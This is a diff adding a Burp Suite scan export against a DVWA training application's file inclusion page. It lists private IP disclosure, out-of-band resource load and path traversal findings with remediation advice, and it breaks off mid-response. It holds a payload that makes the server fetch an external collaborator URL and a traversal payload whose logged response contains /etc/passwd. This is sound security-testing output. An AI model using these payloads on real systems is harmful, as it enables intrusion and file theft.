@@ -1,0 +1,233 @@
+<?xml version="1.0"?>
+<!DOCTYPE issues [
+<!ELEMENT issues (issue*)>
+<!ATTLIST issues burpVersion CDATA "">
+<!ATTLIST issues exportTime CDATA "">
+<!ELEMENT issue (serialNumber, type, name, host, path, location, severity, confidence, issueBackground?, remediationBackground?, references?, vulnerabilityClassifications?, issueDetail?, issueDetailItems?, remediationDetail?, requestresponse*, collaboratorEvent*, infiltratorEvent*, staticAnalysis*, dynamicAnalysis*, prototypePollution*)>
+<!ELEMENT serialNumber (#PCDATA)>
+<!ELEMENT type (#PCDATA)>
+<!ELEMENT name (#PCDATA)>
+<!ELEMENT host (#PCDATA)>
+<!ATTLIST host ip CDATA "">
+<!ELEMENT path (#PCDATA)>
+<!ELEMENT location (#PCDATA)>
+<!ELEMENT severity (#PCDATA)>
+<!ELEMENT confidence (#PCDATA)>
+<!ELEMENT issueBackground (#PCDATA)>
+<!ELEMENT remediationBackground (#PCDATA)>
+<!ELEMENT references (#PCDATA)>
+<!ELEMENT vulnerabilityClassifications (#PCDATA)>
+<!ELEMENT issueDetail (#PCDATA)>
+<!ELEMENT issueDetailItems (issueDetailItem*)>
+<!ELEMENT issueDetailItem (#PCDATA)>
+<!ELEMENT remediationDetail (#PCDATA)>
+<!ELEMENT requestresponse (request?, response?, responseRedirected?)>
+<!ELEMENT request (#PCDATA)>
+<!ATTLIST request method CDATA "">
+<!ATTLIST request base64 (true|false) "false">
+<!ELEMENT response (#PCDATA)>
+<!ATTLIST response base64 (true|false) "false">
+<!ELEMENT responseRedirected (#PCDATA)>
+<!ELEMENT sender (#PCDATA)>
+<!ELEMENT message (#PCDATA)>
+<!ELEMENT conversation (#PCDATA)>
+<!ELEMENT recipient (#PCDATA)>
+<!ELEMENT recipients (recipient*)>
+<!ELEMENT smtp (sender, recipients, message, conversation)>
+<!ELEMENT collaboratorEvent (interactionType, originIp, time, lookupType?, lookupHost?, requestresponse?, smtp?)>
+<!ELEMENT interactionType (#PCDATA)>
+<!ELEMENT originIp (#PCDATA)>
+<!ELEMENT time (#PCDATA)>
+<!ELEMENT lookupType (#PCDATA)>
+<!ELEMENT lookupHost (#PCDATA)>
+<!ELEMENT infiltratorEvent (parameterName, platform, signature, stackTrace?, parameterValue?, collaboratorEvent)>
+<!ELEMENT parameterName (#PCDATA)>
+<!ELEMENT platform (#PCDATA)>
+<!ELEMENT signature (#PCDATA)>
+<!ELEMENT stackTrace (#PCDATA)>
+<!ELEMENT parameterValue (#PCDATA)>
+<!ELEMENT dynamicAnalysis (source, sink, sourceStackTrace, sinkStackTrace, eventListenerStackTrace, sourceValue, sinkValue, eventHandlerData, eventHandlerDataType, eventHandlerManipulatedData, poc, origin, isOriginChecked, sourceElementId, sourceElementName, eventFiredEventName, eventFiredElementId, eventFiredElementName, eventFiredOuterHtml)>
+<!ELEMENT prototypePollution (poc, pollutionTechnique, pollutionType)>
+<!ELEMENT staticAnalysis (source, sink, codeSnippets)>
+<!ELEMENT source (#PCDATA)>
+<!ELEMENT sink (#PCDATA)>
+<!ELEMENT sourceStackTrace (#PCDATA)>
+<!ELEMENT sinkStackTrace (#PCDATA)>
+<!ELEMENT eventListenerStackTrace (#PCDATA)>
+<!ELEMENT sourceValue (#PCDATA)>
+<!ELEMENT sinkValue (#PCDATA)>
+<!ELEMENT eventHandlerData (#PCDATA)>
+<!ELEMENT eventHandlerDataType (#PCDATA)>
+<!ELEMENT sourceElementId (#PCDATA)>
+<!ELEMENT sourceElementName (#PCDATA)>
+<!ELEMENT eventFiredEventName (#PCDATA)>
+<!ELEMENT eventFiredElementId (#PCDATA)>
+<!ELEMENT eventFiredElementName (#PCDATA)>
+<!ELEMENT eventFiredOuterHtml (#PCDATA)>
+<!ELEMENT eventHandlerManipulatedData (#PCDATA)>
+<!ELEMENT poc (#PCDATA)>
+<!ELEMENT origin (#PCDATA)>
+<!ELEMENT isOriginChecked (#PCDATA)>
+<!ELEMENT codeSnippets (codeSnippet*)>
+<!ELEMENT codeSnippet (#PCDATA)>
+<!ELEMENT pollutionTechnique (#PCDATA)>
+<!ELEMENT pollutionType (#PCDATA)>
+]>
+<issues burpVersion="2023.8.1" exportTime="Wed Mar 20 21:04:15 GMT 2024">
+  <issue>
+    <serialNumber>415883865701203968</serialNumber>
+    <type>134217728</type>
+    <name><![CDATA[Private IP addresses disclosed]]></name>
+    <host ip="172.22.0.3">http://web</host>
+    <path><![CDATA[/vulnerabilities/fi/]]></path>
+    <location><![CDATA[/vulnerabilities/fi/]]></location>
+    <severity>Information</severity>
+    <confidence>Certain</confidence>
+    <issueBackground><![CDATA[<p>RFC 1918 specifies ranges of IP addresses that are reserved for use in private networks and cannot be routed on the public Internet. Although various methods exist by which an attacker can determine the public IP addresses in use by an organization, the private addresses used internally cannot usually be determined in the same ways.</p>
+<p>Discovering the private addresses used within an organization can help an attacker in carrying out network-layer attacks aiming to penetrate the organization's internal infrastructure. </p>]]></issueBackground>
+    <remediationBackground><![CDATA[<p>There is not usually any good reason to disclose the internal IP addresses used within an organization's infrastructure. If these are being returned in service banners or debug messages, then the relevant services should be configured to mask the private addresses. If they are being used to track back-end servers for load balancing purposes, then the addresses should be rewritten with innocuous identifiers from which an attacker cannot infer any useful information about the infrastructure.</p>]]></remediationBackground>
+    <issueDetail><![CDATA[The following RFC 1918 IP address was disclosed in the response:<ul><li>172.22.0.3</li></ul>]]></issueDetail>
+    <issueDetailItems>
+      <issueDetailItem><![CDATA[172.22.0.3]]></issueDetailItem>
+    </issueDetailItems>
+    <requestresponse>
+      <request method="GET" base64="true"><![CDATA[R0VUIC92dWxuZXJhYmlsaXRpZXMvZmkvP3BhZ2U9ZnV6eiBIVFRQLzEuMA0KSG9zdDogd2ViDQpDb29raWU6IHNlY3VyaXR5PWxvdw0KDQo=]]></request>
+      <response base64="true"><![CDATA[SFRUUC8xLjEgNDAwIEJhZCBSZXF1ZXN0DQpEYXRlOiBXZWQsIDIwIE1hciAyMDI0IDIwOjU5OjE0IEdNVA0KU2VydmVyOiBBcGFjaGUvMi40LjU3IChEZWJpYW4pDQpDb250ZW50LUxlbmd0aDogMzAyDQpDb25uZWN0aW9uOiBjbG9zZQ0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9aXNvLTg4NTktMQ0KDQo8IURPQ1RZUEUgSFRNTCBQVUJMSUMgIi0vL0lFVEYvL0RURCBIVE1MIDIuMC8vRU4iPgo8aHRtbD48aGVhZD4KPHRpdGxlPjQwMCBCYWQgUmVxdWVzdDwvdGl0bGU+CjwvaGVhZD48Ym9keT4KPGgxPkJhZCBSZXF1ZXN0PC9oMT4KPHA+WW91ciBicm93c2VyIHNlbnQgYSByZXF1ZXN0IHRoYXQgdGhpcyBzZXJ2ZXIgY291bGQgbm90IHVuZGVyc3RhbmQuPGJyIC8+CjwvcD4KPGhyPgo8YWRkcmVzcz5BcGFjaGUvMi40LjU3IChEZWJpYW4pIFNlcnZlciBhdCAxNzIuMjIuMC4zIFBvcnQgODA8L2FkZHJlc3M+CjwvYm9keT48L2h0bWw+Cg==]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+  </issue>
+  <issue>
+    <serialNumber>9009414675117763584</serialNumber>
+    <type>134217728</type>
+    <name><![CDATA[Out-of-band resource load (HTTP)]]></name>
+    <host ip="172.22.0.3">http://web</host>
+    <path><![CDATA[/vulnerabilities/fi/]]></path>
+    <location><![CDATA[/vulnerabilities/fi/]]></location>
+    <severity>High</severity>
+    <confidence>Certain</confidence>
+    <issueBackground><![CDATA[<p>Out-of-band resource load arises when it is possible to induce an application to fetch content from an arbitrary external location, and incorporate that content into the application's own response(s). The ability to trigger arbitrary out-of-band resource load does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application. 
+However, in many cases, it can indicate a vulnerability with serious consequences.</p>
+<p>The ability to request and retrieve web content from other systems can allow the application server to be used as a two-way attack proxy. 
+  By submitting suitable payloads, an attacker can cause the application server to attack, or retrieve content from, other systems that it can interact with. 
+  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
+  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>
+<p>Additionally, the application's processing of web content that is retrieved from arbitrary URLs exposes some important and non-conventional attack surface. 
+  An attacker can deploy a web server that returns malicious content, and then induce the application to retrieve and process that content. 
+  This processing might give rise to the types of input-based vulnerabilities that are normally found when unexpected input is submitted directly in requests to the application. 
+  The out-of-band attack surface that the application exposes should be thoroughly tested for these types of vulnerabilities. </p>]]></issueBackground>
+    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, and determine whether the ability to trigger arbitrary out-of-band resource load is intended behavior. 
+  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
+  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter. 
+You should also ensure that content retrieved from other systems is processed in a safe manner, with the usual precautions that are applicable when processing input from direct incoming web requests.</p>
+<p>If the ability to trigger arbitrary out-of-band resource load is not intended behavior, then you should implement a whitelist of permitted URLs, and block requests to URLs that do not appear on this whitelist.</p>]]></remediationBackground>
+    <issueDetail><![CDATA[It is possible to induce the application to retrieve the contents of an arbitrary external URL and return those contents in its own response.<br><br>The payload <b>http://413dnj634jj0byguf9ugvn1i0962usii69tzho.oastify.com/?fuzz</b> was submitted in the <b>page</b> parameter.<br><br>The application performed an HTTP request to the specified domain. The response from that request was then included in the application's own response.]]></issueDetail>
+    <requestresponse>
+      <request method="GET" base64="true"><![CDATA[R0VUIC92dWxuZXJhYmlsaXRpZXMvZmkvP3BhZ2U9aHR0cCUzYSUyZiUyZjQxM2RuajYzNGpqMGJ5Z3VmOXVndm4xaTA5NjJ1c2lpNjl0emhvLm9hc3RpZnkuY29tJTJmJTNmZnV6eiBIVFRQLzEuMA0KSG9zdDogd2ViDQpDb29raWU6IHNlY3VyaXR5PWxvdw0KDQo=]]></request>
+      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBXZWQsIDIwIE1hciAyMDI0IDIwOjU5OjE3IEdNVA0KU2VydmVyOiBBcGFjaGUvMi40LjU3IChEZWJpYW4pDQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuMTANClNldC1Db29raWU6IFBIUFNFU1NJRD1lcDAwY2h1a3RpZWVtNWpna285dXVkOGJxbDsgcGF0aD0vDQpFeHBpcmVzOiBUdWUsIDIzIEp1biAyMDA5IDEyOjAwOjAwIEdNVA0KQ2FjaGUtQ29udHJvbDogbm8tY2FjaGUsIG11c3QtcmV2YWxpZGF0ZQ0KUHJhZ21hOiBuby1jYWNoZQ0KVmFyeTogQWNjZXB0LUVuY29kaW5nDQpDb250ZW50LUxlbmd0aDogMzE5Ng0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sO2NoYXJzZXQ9dXRmLTgNCg0KCjxodG1sPjxib2R5PjFleWJjcTg3OWtxeG9yNzd6dHp5bnJ6amxnaWdpZ2pmaWd6PC9ib2R5PjwvaHRtbD48IURPQ1RZUEUgaHRtbD4KCjxodG1sIGxhbmc9ImVuLUdCIj4KCgk8aGVhZD4KCQk8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCIgLz4KCgkJPHRpdGxlPlZ1bG5lcmFiaWxpdHk6IEZpbGUgSW5jbHVzaW9uIDo6IERhbW4gVnVsbmVyYWJsZSBXZWIgQXBwbGljYXRpb24gKERWV0EpIHYxLjEwICpEZXZlbG9wbWVudCo8L3RpdGxlPgoKCQk8bGluayByZWw9InN0eWxlc2hlZXQiIHR5cGU9InRleHQvY3NzIiBocmVmPSIuLi8uLi9kdndhL2Nzcy9tYWluLmNzcyIgLz4KCgkJPGxpbmsgcmVsPSJpY29uIiB0eXBlPSJcaW1hZ2UvaWNvIiBocmVmPSIuLi8uLi9mYXZpY29uLmljbyIgLz4KCgkJPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiIHNyYz0iLi4vLi4vZHZ3YS9qcy9kdndhUGFnZS5qcyI+PC9zY3JpcHQ+CgoJPC9oZWFkPgoKCTxib2R5IGNsYXNzPSJob21lIj4KCQk8ZGl2IGlkPSJjb250YWluZXIiPgoKCQkJPGRpdiBpZD0iaGVhZGVyIj4KCgkJCQk8aW1nIHNyYz0iLi4vLi4vZHZ3YS9pbWFnZXMvbG9nby5wbmciIGFsdD0iRGFtbiBWdWxuZXJhYmxlIFdlYiBBcHBsaWNhdGlvbiIgLz4KCgkJCTwvZGl2PgoKCQkJPGRpdiBpZD0ibWFpbl9tZW51Ij4KCgkJCQk8ZGl2IGlkPSJtYWluX21lbnVfcGFkZGVkIj4KCQkJCTx1bCBjbGFzcz0ibWVudUJsb2NrcyI+PGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uLy4iPkhvbWU8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL2luc3RydWN0aW9ucy5waHAiPkluc3RydWN0aW9uczwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vc2V0dXAucGhwIj5TZXR1cCAvIFJlc2V0IERCPC9hPjwvbGk+CjwvdWw+PHVsIGNsYXNzPSJtZW51QmxvY2tzIj48bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL2JydXRlLyI+QnJ1dGUgRm9yY2U8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9leGVjLyI+Q29tbWFuZCBJbmplY3Rpb248L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9jc3JmLyI+Q1NSRjwvYT48L2xpPgo8bGkgY2xhc3M9InNlbGVjdGVkIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvZmkvLj9wYWdlPWluY2x1ZGUucGhwIj5GaWxlIEluY2x1c2lvbjwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL3VwbG9hZC8iPkZpbGUgVXBsb2FkPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvY2FwdGNoYS8iPkluc2VjdXJlIENBUFRDSEE8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9zcWxpLyI+U1FMIEluamVjdGlvbjwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL3NxbGlfYmxpbmQvIj5TUUwgSW5qZWN0aW9uIChCbGluZCk8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy93ZWFrX2lkLyI+V2VhayBTZXNzaW9uIElEczwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL3hzc19kLyI+WFNTIChET00pPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMveHNzX3IvIj5YU1MgKFJlZmxlY3RlZCk8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy94c3Nfcy8iPlhTUyAoU3RvcmVkKTwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL2NzcC8iPkNTUCBCeXBhc3M8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9qYXZhc2NyaXB0LyI+SmF2YVNjcmlwdDwvYT48L2xpPgo8L3VsPjx1bCBjbGFzcz0ibWVudUJsb2NrcyI+PGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3NlY3VyaXR5LnBocCI+RFZXQSBTZWN1cml0eTwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vcGhwaW5mby5waHAiPlBIUCBJbmZvPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi9hYm91dC5waHAiPkFib3V0PC9hPjwvbGk+CjwvdWw+PHVsIGNsYXNzPSJtZW51QmxvY2tzIj48bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vbG9nb3V0LnBocCI+TG9nb3V0PC9hPjwvbGk+CjwvdWw+CgkJCQk8L2Rpdj4KCgkJCTwvZGl2PgoKCQkJPGRpdiBpZD0ibWFpbl9ib2R5Ij4KCgkJCQkKCQkJCTxiciAvPjxiciAvPgoJCQkJCgoJCQk8L2Rpdj4KCgkJCTxkaXYgY2xhc3M9ImNsZWFyIj4KCQkJPC9kaXY+CgoJCQk8ZGl2IGlkPSJzeXN0ZW1faW5mbyI+CgkJCQk8aW5wdXQgdHlwZT0iYnV0dG9uIiB2YWx1ZT0iVmlldyBIZWxwIiBjbGFzcz0icG9wdXBfYnV0dG9uIiBpZD0naGVscF9idXR0b24nIGRhdGEtaGVscC11cmw9Jy4uLy4uL3Z1bG5lcmFiaWxpdGllcy92aWV3X2hlbHAucGhwP2lkPWZpJnNlY3VyaXR5PWxvdyZsb2NhbGU9ZW4nICkiPiA8aW5wdXQgdHlwZT0iYnV0dG9uIiB2YWx1ZT0iVmlldyBTb3VyY2UiIGNsYXNzPSJwb3B1cF9idXR0b24iIGlkPSdzb3VyY2VfYnV0dG9uJyBkYXRhLXNvdXJjZS11cmw9Jy4uLy4uL3Z1bG5lcmFiaWxpdGllcy92aWV3X3NvdXJjZS5waHA/aWQ9Zmkmc2VjdXJpdHk9bG93JyApIj4gPGRpdiBhbGlnbj0ibGVmdCI+PGVtPlVzZXJuYW1lOjwvZW0+IGFkbWluPGJyIC8+PGVtPlNlY3VyaXR5IExldmVsOjwvZW0+IGxvdzxiciAvPjxlbT5Mb2NhbGU6PC9lbT4gZW48YnIgLz48ZW0+UEhQSURTOjwvZW0+IGRpc2FibGVkPGJyIC8+PGVtPlNRTGkgREI6PC9lbT4gbXlzcWw8L2Rpdj4KCQkJPC9kaXY+CgoJCQk8ZGl2IGlkPSJmb290ZXIiPgoKCQkJCTxwPkRhbW4gVnVsbmVyYWJsZSBXZWIgQXBwbGljYXRpb24gKERWV0EpIHYxLjEwICpEZXZlbG9wbWVudCo8L3A+CgkJCQk8c2NyaXB0IHNyYz0nLi4vLi4vL2R2d2EvanMvYWRkX2V2ZW50X2xpc3RlbmVycy5qcyc+PC9zY3JpcHQ+CgoJCQk8L2Rpdj4KCgkJPC9kaXY+CgoJPC9ib2R5PgoKPC9odG1sPg==]]></response>
+      <responseRedirected>false</responseRedirected>
+    </requestresponse>
+    <collaboratorEvent>
+      <interactionType>HTTP</interactionType>
+      <originIp>79.198.83.85</originIp>
+      <time>2024-Mar-20 20:59:17.968 UTC</time>
+      <requestresponse>
+        <request method="GET" base64="true"><![CDATA[R0VUIC8/ZnV6eiBIVFRQLzEuMQ0KSG9zdDogNDEzZG5qNjM0amowYnlndWY5dWd2bjFpMDk2MnVzaWk2OXR6aG8ub2FzdGlmeS5jb20NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
+        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYxDQoNCjxodG1sPjxib2R5PjFleWJjcTg3OWtxeG9yNzd6dHp5bnJ6amxnaWdpZ2pmaWd6PC9ib2R5PjwvaHRtbD4=]]></response>
+        <responseRedirected>false</responseRedirected>
+      </requestresponse>
+    </collaboratorEvent>
+  </issue>
+  <issue>
+    <serialNumber>819583407396082688</serialNumber>
+    <type>134217728</type>
+    <name><![CDATA[File path traversal]]></name>
+    <host ip="172.22.0.3">http://web</host>
+    <path><![CDATA[/vulnerabilities/fi/]]></path>
+    <location><![CDATA[/vulnerabilities/fi/]]></location>
+    <severity>High</severity>
+    <confidence>Firm</confidence>
+    <issueBackground><![CDATA[<p>File path traversal vulnerabilities arise when user-controllable data is used within a filesystem operation in an unsafe manner. Typically, a user-supplied filename is appended to a directory prefix in order to read or write the contents of a file. If vulnerable, an attacker can supply path traversal sequences (using dot-dot-slash characters) to break out of the intended directory and read or write files elsewhere on the filesystem.</p>
+<p>This is typically a very serious vulnerability, enabling an attacker to access sensitive files containing configuration data, passwords, database records, log data, source code, and program scripts and binaries. </p>]]></issueBackground>
+    <remediationBackground><![CDATA[<p>Ideally, application functionality should be designed in such a way that user-controllable data does not need to be passed to filesystem operations. This can normally be achieved by referencing known files via an index number rather than their name, and using application-generated filenames to save user-supplied file content.</p>
+<p>If it is considered unavoidable to pass user-controllable data to a filesystem operation, three layers of defense can be employed to prevent path traversal attacks: </p>
+<ul><li>User-controllable data should be strictly validated before being passed to any filesystem operation. In particular, input containing dot-dot sequences should be blocked.</li><li>After validating user input, the application can use a suitable filesystem API to verify that the file to be accessed is actually located within the base directory used by the application. In Java, this can be achieved by instantiating a java.io.File object using the user-supplied filename and then calling the getCanonicalPath method on this object. If the string returned by this method does not begin with the name of the start directory, then the user has somehow bypassed the application's input filters, and the request should be rejected. In ASP.NET, the same check can be performed by passing the user-supplied filename to the System.Io.Path.GetFullPath method and checking the returned string in the same way as described for Java.</li><li>The directory used to store files that are accessed using user-controllable data can be located on a separate logical volume to other sensitive application and operating system files, so that these cannot be reached via path traversal attacks. In Unix-based systems, this can be achieved using a chrooted filesystem; on Windows, this can be achieved by mounting the base directory as a new logical drive and using the associated drive letter to access its contents.</li></ul>]]></remediationBackground>
+    <issueDetail><![CDATA[The <b>page</b> parameter is vulnerable to path traversal attacks, enabling read access to arbitrary files on the server.<br><br>The payload <b>../../../../../../../../../../../../../../../../etc/passwd</b> was submitted in the page parameter. The requested file was returned in the application's response.]]></issueDetail>
+    <requestresponse>
+      <request method="GET" base64="true"><![CDATA[R0VUIC92dWxuZXJhYmlsaXRpZXMvZmkvP3BhZ2U9Li4lMmYuLiUyZi4uJTJmLi4lMmYuLiUyZi4uJTJmLi4lMmYuLiUyZi4uJTJmLi4lMmYuLiUyZi4uJTJmLi4lMmYuLiUyZi4uJTJmLi4lMmZldGMlMmZwYXNzd2QgSFRUUC8xLjANCkhvc3Q6IHdlYg0KQ29va2llOiBzZWN1cml0eT1sb3cNCg0K]]></request>
+      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBXZWQsIDIwIE1hciAyMDI0IDIwOjU5OjE4IEdNVA0KU2VydmVyOiBBcGFjaGUvMi40LjU3IChEZWJpYW4pDQpYLVBvd2VyZWQtQnk6IFBIUC84LjIuMTANClNldC1Db29raWU6IFBIUFNFU1NJRD01dWZsazdnazBxY20zZG51cnNmZjZsaTE4NzsgcGF0aD0vDQpFeHBpcmVzOiBUdWUsIDIzIEp1biAyMDA5IDEyOjAwOjAwIEdNVA0KQ2FjaGUtQ29udHJvbDogbm8tY2FjaGUsIG11c3QtcmV2YWxpZGF0ZQ0KUHJhZ21hOiBuby1jYWNoZQ0KVmFyeTogQWNjZXB0LUVuY29kaW5nDQpDb250ZW50LUxlbmd0aDogMzk3NA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sO2NoYXJzZXQ9dXRmLTgNCg0KCnJvb3Q6eDowOjA6cm9vdDovcm9vdDovYmluL2Jhc2gKZGFlbW9uOng6MToxOmRhZW1vbjovdXNyL3NiaW46L3Vzci9zYmluL25vbG9naW4KYmluOng6MjoyOmJpbjovYmluOi91c3Ivc2Jpbi9ub2xvZ2luCnN5czp4OjM6MzpzeXM6L2RldjovdXNyL3NiaW4vbm9sb2dpbgpzeW5jOng6NDo2NTUzNDpzeW5jOi9iaW46L2Jpbi9zeW5jCmdhbWVzOng6NTo2MDpnYW1lczovdXNyL2dhbWVzOi91c3Ivc2Jpbi9ub2xvZ2luCm1hbjp4OjY6MTI6bWFuOi92YXIvY2FjaGUvbWFuOi91c3Ivc2Jpbi9ub2xvZ2luCmxwOng6Nzo3OmxwOi92YXIvc3Bvb2wvbHBkOi91c3Ivc2Jpbi9ub2xvZ2luCm1haWw6eDo4Ojg6bWFpbDovdmFyL21haWw6L3Vzci9zYmluL25vbG9naW4KbmV3czp4Ojk6OTpuZXdzOi92YXIvc3Bvb2wvbmV3czovdXNyL3NiaW4vbm9sb2dpbgp1dWNwOng6MTA6MTA6dXVjcDovdmFyL3Nwb29sL3V1Y3A6L3Vzci9zYmluL25vbG9naW4KcHJveHk6eDoxMzoxMzpwcm94eTovYmluOi91c3Ivc2Jpbi9ub2xvZ2luCnd3dy1kYXRhOng6MzM6MzM6d3d3LWRhdGE6L3Zhci93d3c6L3Vzci9zYmluL25vbG9naW4KYmFja3VwOng6MzQ6MzQ6YmFja3VwOi92YXIvYmFja3VwczovdXNyL3NiaW4vbm9sb2dpbgpsaXN0Ong6Mzg6Mzg6TWFpbGluZyBMaXN0IE1hbmFnZXI6L3Zhci9saXN0Oi91c3Ivc2Jpbi9ub2xvZ2luCmlyYzp4OjM5OjM5OmlyY2Q6L3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDo0Mjo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KPCFET0NUWVBFIGh0bWw+Cgo8aHRtbCBsYW5nPSJlbi1HQiI+CgoJPGhlYWQ+CgkJPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTgiIC8+CgoJCTx0aXRsZT5WdWxuZXJhYmlsaXR5OiBGaWxlIEluY2x1c2lvbiA6OiBEYW1uIFZ1bG5lcmFibGUgV2ViIEFwcGxpY2F0aW9uIChEVldBKSB2MS4xMCAqRGV2ZWxvcG1lbnQqPC90aXRsZT4KCgkJPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgaHJlZj0iLi4vLi4vZHZ3YS9jc3MvbWFpbi5jc3MiIC8+CgoJCTxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iXGltYWdlL2ljbyIgaHJlZj0iLi4vLi4vZmF2aWNvbi5pY28iIC8+CgoJCTxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9Ii4uLy4uL2R2d2EvanMvZHZ3YVBhZ2UuanMiPjwvc2NyaXB0PgoKCTwvaGVhZD4KCgk8Ym9keSBjbGFzcz0iaG9tZSI+CgkJPGRpdiBpZD0iY29udGFpbmVyIj4KCgkJCTxkaXYgaWQ9ImhlYWRlciI+CgoJCQkJPGltZyBzcmM9Ii4uLy4uL2R2d2EvaW1hZ2VzL2xvZ28ucG5nIiBhbHQ9IkRhbW4gVnVsbmVyYWJsZSBXZWIgQXBwbGljYXRpb24iIC8+CgoJCQk8L2Rpdj4KCgkJCTxkaXYgaWQ9Im1haW5fbWVudSI+CgoJCQkJPGRpdiBpZD0ibWFpbl9tZW51X3BhZGRlZCI+CgkJCQk8dWwgY2xhc3M9Im1lbnVCbG9ja3MiPjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi8uIj5Ib21lPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi9pbnN0cnVjdGlvbnMucGhwIj5JbnN0cnVjdGlvbnM8L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3NldHVwLnBocCI+U2V0dXAgLyBSZXNldCBEQjwvYT48L2xpPgo8L3VsPjx1bCBjbGFzcz0ibWVudUJsb2NrcyI+PGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy9icnV0ZS8iPkJydXRlIEZvcmNlPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvZXhlYy8iPkNvbW1hbmQgSW5qZWN0aW9uPC9hPjwvbGk+CjxsaSBjbGFzcz0iIj48YSBocmVmPSIuLi8uLi92dWxuZXJhYmlsaXRpZXMvY3NyZi8iPkNTUkY8L2E+PC9saT4KPGxpIGNsYXNzPSJzZWxlY3RlZCI+PGEgaHJlZj0iLi4vLi4vdnVsbmVyYWJpbGl0aWVzL2ZpLy4/cGFnZT1pbmNsdWRlLnBocCI+RmlsZSBJbmNsdXNpb248L2E+PC9saT4KPGxpIGNsYXNzPSIiPjxhIGhyZWY9Ii4uLy4uL3Z1bG5lcmFiaWxpdGllcy91cGxvYWQvIj5GaWxlIFVwbG9hZDwvYT48L2xpPgo8bGkgY2xhc3M9IiI+PGEgaHJlZj0iLi4vLi4vdnVsbmV